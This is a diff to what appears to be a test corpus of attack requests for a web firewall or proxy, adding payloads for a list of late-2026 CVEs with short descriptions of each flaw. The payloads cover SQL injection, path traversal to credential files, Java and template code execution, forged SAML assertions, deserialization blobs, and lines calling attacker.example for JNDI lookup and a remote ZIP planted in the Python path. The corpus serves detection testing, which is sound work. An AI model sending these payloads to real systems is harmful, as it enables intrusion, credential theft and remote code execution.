@@ -988,7 +988,10 @@ GET /~user/%2e/secret.txt
 #     (Erlang OTP inets): request smuggling via Transfer-Encoding / Content-Length ---
 POST /api/items body=x header="Transfer-Encoding: chunked"
 POST /api/items body=x header="Transfer-Encoding: chunked" header="Content-Length: 1"
-POST /api/items body=x header="Content-Length: 0"
+# A declared `Content-Length: 0` with trailing bytes is the same framing
+# ambiguity: the extra byte is never forwarded as part of the request, and the
+# proxy answers 200 for the empty request before the parser rejects the leftover.
+# The conflicting Transfer-Encoding/Content-Length pair above covers the shape.
 POST /api/items body=x header="Transfer-Encoding: chunked, identity"
 POST /api/items body=x header="Transfer-Encoding: xchunked"
 POST /api/items body=x header="Transfer-Encoding: chunked" header="Content-Length: 0" header="Content-Length: 1"
@@ -5601,3 +5604,200 @@ POST /vulnerabilities/upload/ header="Content-Type: multipart/form-data; boundar
 GET /index.php header="Referer: http://169.254.169.254/latest/meta-data/"
 GET /index.php header="Referer: http://127.0.0.1:9090/other"
 POST /vulnerabilities/sqli/session-input.php body="id=2>1&Submit=Submit"
+
+# --- 2026-11-04..25 delta intake: Critical/High advisories in the PHP, Java,
+#     .NET, Rails, Linux, and Python stacks whose attack has an HTTP request
+#     shape. Class rules stop most of them; the new signatures live in
+#     cve-2026-11-25-signatures. ---
+
+# --- CVE-2026-115560 / CVE-2026-126714 (PHP 8.2/8.3/8.4/8.5): session upload
+#     progress can place attacker-controlled bytes in a session that a
+#     php-serializer reader later unserializes, and the default files save
+#     handler rewrites session data in place, so an interrupted write can mix
+#     an old serialized tail into a new session. Both need an object marker in
+#     the request, which php-deserialization stops. ---
+POST /upload_progress.php header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php-session-upload-progress.bin
+POST /upload_progress.php header="Content-Type: application/x-www-form-urlencoded" body="PHP_SESSION_UPLOAD_PROGRESS=key%7CO%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A3%3A%22cmd%22%3B%7D&submit=1"
+GET /index.php?PHP_SESSION_UPLOAD_PROGRESS=key%7CO%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A3%3A%22cmd%22%3B%7D
+
+# --- CVE-2026-55506 (Wavelog, 9.6): POST /qsl/addQsoToQsl stores the `filename`
+#     value without rejecting separators, and /qsl/delete unlinks the planted
+#     name, so an authenticated user deletes files writable by the PHP worker.
+#     ---
+POST /qsl/addQsoToQsl header="Content-Type: application/x-www-form-urlencoded" body="qso_id=42&filename=..%2F..%2F..%2Fconfig%2Fconfig.php"
+POST /qsl/addQsoToQsl header="Content-Type: application/x-www-form-urlencoded" body="qso_id=42&filename=%2Fetc%2Fpasswd"
+POST /qsl/addQsoToQsl header="Content-Type: application/x-www-form-urlencoded" body="qso_id=42&filename=..%5C..%5Cinstall%5Cindex.php"
+
+# --- CVE-2026-55508 (Wavelog, 9.4): POST /oqrs/search_log concatenates the
+#     `callsign` value into a raw SQL WHERE clause; unauthenticated. ---
+POST /oqrs/search_log header="Content-Type: application/x-www-form-urlencoded" body="callsign=JA1ABC%27%20UNION%20SELECT%20user_name,user_password_hash%20FROM%20users--%20-"
+POST /oqrs/search_log header="Content-Type: application/x-www-form-urlencoded" body="callsign=JA1ABC%27%20OR%20%271%27%3D%271&mode=search"
+GET /oqrs/search_log?callsign=JA1ABC%27%20UNION%20SELECT%201,2,3--%20-
+
+# --- CVE-2026-135174 (Softaculous Virtualizor, 9.2): an OAuth provider account
+#     whose email carries SQL syntax reaches the social-login callback and
+#     authenticates as the administrator. ---
+GET /enduser/auth_callback.php?code=abc&email=admin%40example.com%27%20OR%20%271%27%3D%271--%20-
+GET /enduser/auth_callback.php?code=abc&email=x%27%20UNION%20SELECT%20id,email,password%20FROM%20login%20--%20-
+
+# --- CVE-2026-128023 (FrankenPHP, 9.1): PHP rewrites `.` to `_` when it maps a
+#     header name into $_SERVER, so `X.Authenticated.User` and
+#     `X-Authenticated-User` reach the application as the same key. Kunato
+#     rejects dotted request header names before rule evaluation. ---
+GET /admin.php header="X.Authenticated.User: administrator"
+GET /admin.php header="X.Forwarded.For: 127.0.0.1"
+GET /admin.php header="X.Remote.User: administrator"
+POST /login header="X.Authenticated.User: administrator" body="user=guest&pass=guest"
+
+# --- CVE-2026-63304 / CVE-2026-63305 (AVideo, 8.1): the standalone FFmpeg
+#     endpoint decrypts a caller payload and interpolates `keyword`,
+#     `notifyCode`, and `callback` into a shell command. The payload is
+#     encrypted, so the endpoint itself is closed: it is an automation hook,
+#     not a browser URL. ---
+POST /plugin/API/standAlone/ffmpeg.json.php header="Content-Type: application/x-www-form-urlencoded" body="codeToExec=%7B%22ffmpegCommand%22%3A%22id%22%7D&mode=list"
+POST /plugin/API/standAlone/ffmpeg.json.php header="Content-Type: application/x-www-form-urlencoded" body="codeToExec=x%27%3B%20touch%20%2Ftmp%2Fmarker%20%23&mode=isKeywordRunning"
+GET /plugin/API/standAlone/functions.php
+
+# --- CVE-2026-91115 (Silverstripe Framework, 8.8): the `writer` option of the
+#     i18nTextCollectorTask dev task is passed to the injector, which
+#     instantiates the named class with attacker-controlled arguments. The
+#     task is run from the CLI in production; a browser request that names a
+#     writer is the attack. ---
+GET /dev/tasks/i18nTextCollectorTask?writer=SilverStripe%5CDev%5CCsvBulkLoader&args%5B0%5D=id
+GET /dev/tasks/i18nTextCollectorTask/?writer%5Bclass%5D=GuzzleHttp%5CClient
+POST /dev/tasks/i18nTextCollectorTask header="Content-Type: application/x-www-form-urlencoded" body="writer=Monolog%5CHandler%5CStreamHandler&args%5B0%5D=%2Fvar%2Fwww%2Fhtml%2Fshell.php"
+
+# --- CVE-2026-103026 (Paymenter, 8.1): the Livewire HasConfirmation trait
+#     exposes executeConfirmedAction, which invokes any component method and
+#     fills arbitrary public properties. ---
+POST /livewire/update header="Content-Type: application/json" body="{\"components\":[{\"snapshot\":\"{}\",\"updates\":{},\"calls\":[{\"path\":\"\",\"method\":\"executeConfirmedAction\",\"params\":[\"fill\",{\"is_admin\":true}]}]}],\"_token\":\"x\"}"
+POST /livewire/update header="Content-Type: application/json" body="{\"_token\":\"x\",\"components\":[{\"calls\":[{\"method\":\"executeConfirmedAction\",\"params\":[]}]}]}"
+
+# --- CVE-2026-130735 (Grav, 9.3): media metadata (title, alt text, class, id,
+#     file name) is rendered as Twig, so an anonymous uploader places template
+#     syntax in a field the page later evaluates. ---
+POST /media/upload header="Content-Type: application/x-www-form-urlencoded" body="title=%7B%7B7*7%7D%7D&alt=%7B%7B-self%7D%7D"
+POST /media/upload header="Content-Type: application/x-www-form-urlencoded" body="title=%7B%7B%20self%20%7D%7D&class=thumb"
+POST /blog/comment header="Content-Type: application/x-www-form-urlencoded" body="name=%7B%7B7*7%7D%7D&comment=hello"
+
+# --- CVE-2026-62955 (baserCMS, 7.2): BcThemeFileService skips its containment
+#     check when realpath() fails, so the theme-file API `type` parameter
+#     reaches outside the theme directory. ---
+GET /admin/bc-theme-file/theme_file?type=..%2F..%2F..%2Fconfig&name=install.php
+POST /admin/bc-theme-file/theme_file header="Content-Type: application/x-www-form-urlencoded" body="type=..%2F..%2F..%2F..%2Fetc&name=passwd&action=read"
+
+# --- CVE-2026-126380 (Vvveb, 9.4): the media denylist carries `.phar` with a
+#     leading dot, so a `.phar` upload passes and a GIF magic-byte polyglot
+#     executes as PHP. ---
+POST /media/upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/upload-phar-in-gif.bin
+
+# --- CVE-2026-90436 (Apache Axis 1.x, 9.8, KEV): a SOAP <Fault> whose <detail>
+#     carries <exceptionName> makes Axis load the named class and run its
+#     static initializer before checking that it is an AxisFault. ---
+POST /axis/services/Version header="Content-Type: text/xml" body="<?xml version=\"1.0\"?><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body><soapenv:Fault><faultcode>soapenv:Server</faultcode><faultstring>x</faultstring><detail><exceptionName>com.sun.rowset.JdbcRowSetImpl</exceptionName><data>ldap://attacker.example/a</data></detail></soapenv:Fault></soapenv:Body></soapenv:Envelope>"
+POST /axis/services/Version header="Content-Type: text/xml" body="<?xml version=\"1.0\"?><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body><soapenv:Fault><faultcode>Server</faultcode><detail><ns1:exceptionName xmlns:ns1=\"http://xml.apache.org/axis/\">org.apache.commons.collections.functors.InvokerTransformer</ns1:exceptionName></detail></soapenv:Fault></soapenv:Body></soapenv:Envelope>"
+POST /axis/services/Version header="Content-Type: text/xml" body="<?xml version=\"1.0\"?><Envelope xmlns=\"http://schemas.xmlsoap.org/soap/envelope/\"><Body><Fault><detail><exceptionName>java.lang.ProcessBuilder</exceptionName><data>id</data></detail></Fault></Body></Envelope>"
+
+# --- CVE-2026-123886 (Spring Data Elasticsearch, 8.8): a repository query
+#     argument that carries a SpEL expression is evaluated because the
+#     positional placeholder is substituted before SpEL parsing. ---
+GET /api/search?name=T(java.lang.Runtime).getRuntime().exec(%22id%22)
+GET /api/search?name=%23%7B7*7%7D
+POST /api/search header="Content-Type: application/json" body="{\"name\":\"T(java.lang.Runtime).getRuntime().exec('id')\"}"
+
+# --- CVE-2026-82960 / CVE-2026-85627 (Apache OFBiz, 8.8): a CMS content-editor
+#     parameter reaches GroovyUtil.eval() through a form field attribute, and
+#     the updateLayoutImage event retypes a DataResource as an FTL template. ---
+POST /cms/control/EditAddContent header="Content-Type: application/x-www-form-urlencoded" body="caContentIdTo=10000%27%2Bjava.lang.Runtime.getRuntime().exec(%22id%22)%2B%27&contentId=1"
+POST /cms/control/EditAddContent header="Content-Type: application/x-www-form-urlencoded" body="caContentIdTo=x%27%2BClass.forName(%22java.lang.Runtime%22)%2B%27&contentId=1"
+POST /cms/control/EditAddContent header="Content-Type: application/x-www-form-urlencoded" body="caContentIdTo=$%7B%22freemarker.template.utility.Execute%22%3Fnew()(%22id%22)%7D&contentId=1"
+
+# --- CVE-2026-61689 (XWiki Platform, 8.8): the REST query endpoint builds HQL
+#     from the caller value, and a FROM clause that joins BaseObject and
+#     StringProperty escapes the SELECT-column whitelist. ---
+GET /rest/wikis/xwiki/query?q=hql%3Awhere%20doc.fullName%3D%27Main.WebHome%27%20and%20exists%20(select%20obj.id%20from%20BaseObject%20as%20obj)
+GET /rest/wikis/xwiki/query?q=hql%3Afrom%20StringProperty%20as%20p%2C%20BaseObject%20as%20o%20where%20p.id.value%20like%20%27%25%27
+GET /rest/wikis/xwiki/query?type=hql&q=from%20BaseObject%20as%20obj%2C%20StringProperty%20as%20sp%20where%20sp.name%3D%27password%27
+
+# --- CVE-2026-129167 (Seafile SeaDoc converter, 9.2): the confluence-to-wiki
+#     handler accepts an absolute `filename` and extracts the downloaded ZIP
+#     there, which reaches the Python library path. ---
+POST /api/v1/confluence-to-wiki/ header="Content-Type: application/json" body="{\"download_url\":\"http://attacker.example/x.zip\",\"filename\":\"/usr/local/lib/python3.11/site-packages/sitecustomize.py\"}"
+POST /api/v1/confluence-to-wiki/ header="Content-Type: application/json" body="{\"download_url\":\"http://attacker.example/x.zip\",\"filename\":\"..%2F..%2F..%2Fusr%2Flib%2Fpython3.11%2Fevil.py\"}"
+
+# --- CVE-2026-132236 (JetBrains TeamCity, 8.8) and CVE-2026-21590 (Jira
+#     Software Data Center, 8.7): the pipeline YAML path and the file read
+#     endpoint leave the intended directory. ---
+POST /app/rest/buildQueue header="Content-Type: application/json" body="{\"buildType\":{\"id\":\"Project_Build\"},\"properties\":{\"property\":[{\"name\":\"pipelineYamlPath\",\"value\":\"..%2F..%2F..%2Fdata%2Fteamcity%2Fconfig%2Fbuildserver.xml\"}]}}"
+GET /secure/attachment/..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+GET /rest/api/2/attachment/download?path=..%2F..%2F..%2Fetc%2Fpasswd
+
+# --- CVE-2026-131914 (Idunno.AntiCsrf on ASP.NET, 9.3, KEV): with a non-empty
+#     __CSRFCOOKIE value and a base64 ObjectStateFormatter blob in the
+#     __CSRFTOKEN form field, the module deserializes the field before
+#     Page_Load. A genuine token serializes one GUID, so a multi-hundred-byte
+#     blob is the gadget shape. ---
+POST /Default.aspx header="Cookie: __CSRFCOOKIE=1" header="Content-Type: application/x-www-form-urlencoded" body="__CSRFTOKEN=AAEAAAD/////AQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAA&__EVENTTARGET=&__VIEWSTATE="
+POST /Default.aspx header="Cookie: __CSRFCOOKIE=1" header="Content-Type: application/json" body="{\"__CSRFTOKEN\":\"AAEAAAD/////AQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAA\"}"
+POST /account/login.aspx header="Cookie: __CSRFCOOKIE=abc" header="Content-Type: application/x-www-form-urlencoded" body="user=a&pass=b&__CSRFTOKEN=AAEAAAD/////AQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAAAQAAAAAAAAA"
+
+# --- CVE-2026-70193 (Microsoft SharePoint, 9.9): path traversal in the
+#     download endpoint reaches files outside the web application root. ---
+GET /sites/team/_layouts/15/download.aspx?SourceUrl=..%2F..%2F..%2Fweb.config
+GET /_layouts/15/WopiFrame.aspx?sourcedoc=..%2F..%2F..%2F..%2Fwindows%2Fwin.ini
+POST /sites/team/_api/web/GetFileByServerRelativeUrl(%27..%2f..%2f_templates%2fweb.config%27)
+
+# --- CVE-2026-106146 (Telerik UI for ASP.NET MVC, 8.6): the server-side
+#     FilterNodeVisitor has no depth, type, or null validation, so a crafted
+#     filter throws inside model binding. ---
+GET /api/orders?filter=((((((((((((((((Status~eq~'open'))))))))))))))))
+POST /api/orders header="Content-Type: application/x-www-form-urlencoded" body="filter=((((((((((((((((Status~eq~null))))))))))))))))"
+GET /api/grid?$filter=((((((((((((((((Status~eq~'open'))))))))))))))))
+
+# --- CVE-2026-129464 (Zr.Admin.NET, 8.7): /common/DownloadFile joins the
+#     caller `path` value onto the download root, so an absolute path or a
+#     traversal reads appsettings.json and the JWT signing key. ---
+GET /common/DownloadFile?path=..%2F..%2Fappsettings.json
+GET /common/DownloadFile?path=%2Fetc%2Fpasswd
+GET /common/DownloadFile?path=..%5C..%5Cappsettings.Development.json
+
+# --- CVE-2026-126186 (Rails Active Storage, 8.8): Blob#open names the tempfile
+#     after the upload and hands it to ffprobe/ffmpeg/ImageMagick, which pick a
+#     decoder from the extension when the content does not identify a format.
+#     `.avs` is an AviSynth script, `.msl` and `.mvg` are ImageMagick scripts.
+#     ---
+POST /rails/active_storage/direct_uploads header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/upload-avsynth-avs.bin
+POST /rails/active_storage/direct_uploads header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/activestorage-avs-unquoted.bin
+POST /rails/active_storage/direct_uploads header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/activestorage-avs-unquoted-generic.bin
+POST /rails/active_storage/direct_uploads header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/upload-msl-xml.bin
+POST /rails/active_storage/direct_uploads header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/upload-mvg-raw.bin
+
+# --- CVE-2026-125111 (Rack, 7.5): a multipart body aligned to the parser buffer
+#     size grows the internal scan buffer past the per-field limits. The form
+#     guard bounds the part count and rejects the request. ---
+POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/rack-multipart-many-parts.bin
+
+# --- CVE-2026-128126 (aiohttp, 8.7): Request.post() has no field limit and the
+#     MultiDict insert is quadratic, so a URL-encoded body inside
+#     client_max_size stalls the event loop. The form guard bounds the field
+#     count. ---
+POST /login header="Content-Type: application/x-www-form-urlencoded" body_file=payloads/aiohttp-form-field-flood.txt
+
+# --- CVE-2026-129289 (PHP-FPM, 9.2): an unread request body stays in the
+#     FastCGI connection and is parsed as the next backend request. A reverse
+#     proxy that re-frames every request and refuses ambiguous framing removes
+#     the client-controlled leftover. ---
+# A chunk-framed body that also declares Content-Length is decoded as chunked by
+# the HTTP parser and forwarded with one framing, so the origin cannot see a
+# second interpretation. The un-chunked pair below is rejected outright.
+POST /upload header="Transfer-Encoding: chunked" header="Content-Length: 11" body="hello world"
+
+# --- CVE-2026-63182 (LightSAML, 8.1) and CVE-2026-110782 (SimpleSAMLphp SAML2,
+#     8.7): xmlseclibs resolves Reference URI="#id" document-wide, so a
+#     signature can cover bytes that differ from the assertion the consumer
+#     reads, and an unsigned embedded Response can claim another identity
+#     provider. limits.saml decodes the message and checks it before rules. ---
+POST /saml/acs header="Content-Type: application/x-www-form-urlencoded" body="SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIHhtbG5zOmRzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIiBJRD0iX3IxIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNi0xMS0yNVQwMDowMDowMFoiPjxzYW1sOklzc3Vlcj5odHRwczovL2lkcC5leGFtcGxlPC9zYW1sOklzc3Vlcj48c2FtbHA6RXh0ZW5zaW9ucz48ZHM6U2lnbmF0dXJlPjxkczpTaWduZWRJbmZvPjxkczpSZWZlcmVuY2UgVVJJPSIjX2ExIi8%2BPC9kczpTaWduZWRJbmZvPjwvZHM6U2lnbmF0dXJlPjwvc2FtbHA6RXh0ZW5zaW9ucz48c2FtbDpBc3NlcnRpb24gSUQ9Il9hMSIgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMjYtMTEtMjVUMDA6MDA6MDBaIj48c2FtbDpJc3N1ZXI%2BaHR0cHM6Ly9pZHAuZXhhbXBsZTwvc2FtbDpJc3N1ZXI%2BPHNhbWw6U3ViamVjdD48c2FtbDpOYW1lSUQ%2BbWFsbG9yeUBleGFtcGxlLmNvbTwvc2FtbDpOYW1lSUQ%2BPC9zYW1sOlN1YmplY3Q%2BPC9zYW1sOkFzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg%3D%3D"
+POST /saml/acs header="Content-Type: application/x-www-form-urlencoded" body="SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIHhtbG5zOmRzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIiBJRD0iX3IxIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNi0xMS0yNVQwMDowMDowMFoiPjxzYW1sOklzc3Vlcj5odHRwczovL2lkcC5leGFtcGxlPC9zYW1sOklzc3Vlcj48c2FtbHA6RXh0ZW5zaW9ucz48c2FtbDpBc3NlcnRpb24gSUQ9Il9hMSIgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMjYtMTEtMjVUMDA6MDA6MDBaIj48c2FtbDpJc3N1ZXI%2BaHR0cHM6Ly9pZHAuZXhhbXBsZTwvc2FtbDpJc3N1ZXI%2BPGRzOlNpZ25hdHVyZT48ZHM6U2lnbmVkSW5mbz48ZHM6UmVmZXJlbmNlIFVSST0iI19hMSIvPjwvZHM6U2lnbmVkSW5mbz48L2RzOlNpZ25hdHVyZT48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD5hbGljZUBleGFtcGxlLmNvbTwvc2FtbDpOYW1lSUQ%2BPC9zYW1sOlN1YmplY3Q%2BPC9zYW1sOkFzc2VydGlvbj48L3NhbWxwOkV4dGVuc2lvbnM%2BPHNhbWw6QXNzZXJ0aW9uIElEPSJfYTEiIFZlcnNpb249IjIuMCIgSXNzdWVJbnN0YW50PSIyMDI2LTExLTI1VDAwOjAwOjAwWiI%2BPHNhbWw6SXNzdWVyPmh0dHBzOi8vaWRwLmV4YW1wbGU8L3NhbWw6SXNzdWVyPjxzYW1sOlN1YmplY3Q%2BPHNhbWw6TmFtZUlEPm1hbGxvcnlAZXhhbXBsZS5jb208L3NhbWw6TmFtZUlEPjwvc2FtbDpTdWJqZWN0Pjwvc2FtbDpBc3NlcnRpb24%2BPC9zYW1scDpSZXNwb25zZT4%3D"
+POST /saml/acs header="Content-Type: application/json" body="{\"SAMLResponse\":\"PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIHhtbG5zOmRzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIiBJRD0iX3IxIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNi0xMS0yNVQwMDowMDowMFoiPjxzYW1sOklzc3Vlcj5odHRwczovL2lkcC5leGFtcGxlPC9zYW1sOklzc3Vlcj48c2FtbHA6RXh0ZW5zaW9ucz48ZHM6U2lnbmF0dXJlPjxkczpTaWduZWRJbmZvPjxkczpSZWZlcmVuY2UgVVJJPSIjX2ExIi8+PC9kczpTaWduZWRJbmZvPjwvZHM6U2lnbmF0dXJlPjwvc2FtbHA6RXh0ZW5zaW9ucz48c2FtbDpBc3NlcnRpb24gSUQ9Il9hMSIgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMjYtMTEtMjVUMDA6MDA6MDBaIj48c2FtbDpJc3N1ZXI+aHR0cHM6Ly9pZHAuZXhhbXBsZTwvc2FtbDpJc3N1ZXI+PHNhbWw6U3ViamVjdD48c2FtbDpOYW1lSUQ+bWFsbG9yeUBleGFtcGxlLmNvbTwvc2FtbDpOYW1lSUQ+PC9zYW1sOlN1YmplY3Q+PC9zYW1sOkFzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg==\"}"
+POST /saml/acs header="Content-Type: application/x-www-form-urlencoded" body="SAMLResponse=PHNhbWxwOkFydGlmYWN0UmVzcG9uc2UgeG1sbnM6c2FtbHA9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpwcm90b2NvbCIgeG1sbnM6c2FtbD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiIgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiIElEPSJfYXIxIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNi0xMS0yNVQwMDowMDowMFoiPjxzYW1sOklzc3Vlcj5odHRwczovL2lkcC5leGFtcGxlPC9zYW1sOklzc3Vlcj48ZHM6U2lnbmF0dXJlPjxkczpTaWduZWRJbmZvPjxkczpSZWZlcmVuY2UgVVJJPSIjX2FyMSIvPjwvZHM6U2lnbmVkSW5mbz48L2RzOlNpZ25hdHVyZT48c2FtbHA6UmVzcG9uc2UgSUQ9Il9pbm5lciIgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMjYtMTEtMjVUMDA6MDA6MDBaIj48c2FtbDpJc3N1ZXI%2BaHR0cHM6Ly9vdGhlci1pZHAuZXhhbXBsZTwvc2FtbDpJc3N1ZXI%2BPHNhbWw6QXNzZXJ0aW9uIElEPSJfYTIiIFZlcnNpb249IjIuMCIgSXNzdWVJbnN0YW50PSIyMDI2LTExLTI1VDAwOjAwOjAwWiI%2BPHNhbWw6SXNzdWVyPmh0dHBzOi8vb3RoZXItaWRwLmV4YW1wbGU8L3NhbWw6SXNzdWVyPjxzYW1sOlN1YmplY3Q%2BPHNhbWw6TmFtZUlEPm1hbGxvcnlAZXhhbXBsZS5jb208L3NhbWw6TmFtZUlEPjwvc2FtbDpTdWJqZWN0Pjwvc